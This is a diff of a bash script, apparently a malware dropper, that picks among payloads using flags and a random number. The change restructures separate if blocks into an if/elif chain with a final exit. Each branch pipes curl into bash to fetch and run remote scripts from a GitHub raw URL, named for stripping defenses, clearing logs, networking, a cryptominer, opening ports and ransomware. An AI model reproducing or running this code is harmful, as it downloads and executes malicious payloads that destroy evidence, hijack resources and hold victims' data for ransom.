@@ -12,31 +12,29 @@ i = $RANDOM
 if [[ $DEF = true ]] && [[ $(($i % 101)) -ge 0 ]] && [[ $(($i % 101)) -lt 10 ]]
 then
 	curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/strip_def | bash
-fi
 
-if [[ $LOG = true ]] && [[ $(($i % 101)) -ge 10 ]] && [[ $(($i % 101)) -lt 20 ]]
+elif [[ $LOG = true ]] && [[ $(($i % 101)) -ge 10 ]] && [[ $(($i % 101)) -lt 20 ]]
 then
 	curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/clear_logs | bash
-fi
 
-if [[ $NET = true ]] && [[ $(($i % 101)) -ge 20 ]] && [[ $(($i % 101)) -lt 30 ]] | bash
+elif [[ $NET = true ]] && [[ $(($i % 101)) -ge 20 ]] && [[ $(($i % 101)) -lt 30 ]]
 then
         curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/net | bash
-fi
 
-if [[ $MINER = true ]] && [[ $(($i % 101)) -ge 30 ]] && [[ $(($i % 101)) -lt 40 ]]
+elif [[ $MINER = true ]] && [[ $(($i % 101)) -ge 30 ]] && [[ $(($i % 101)) -lt 40 ]]
 then
         curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/miner | bash
-fi
 
-if [[ $PORT = true ]] && [[ $(($i % 101)) -ge 40 ]] && [[ $(($i % 101)) -lt 50 ]]
+elif [[ $PORT = true ]] && [[ $(($i % 101)) -ge 40 ]] && [[ $(($i % 101)) -lt 50 ]]
 then
         curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/ports | bash
-fi
 
-if [[ $BLOCK = true ]] && [[ $(($i % 101)) -ge 50 ]] && [[ $(($i % 101)) -lt 60 ]]
+elif [[ $BLOCK = true ]] && [[ $(($i % 101)) -ge 50 ]] && [[ $(($i % 101)) -lt 60 ]]
 then
         curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/ransom | bash
+
+else
+	exit 0
 fi
 
 
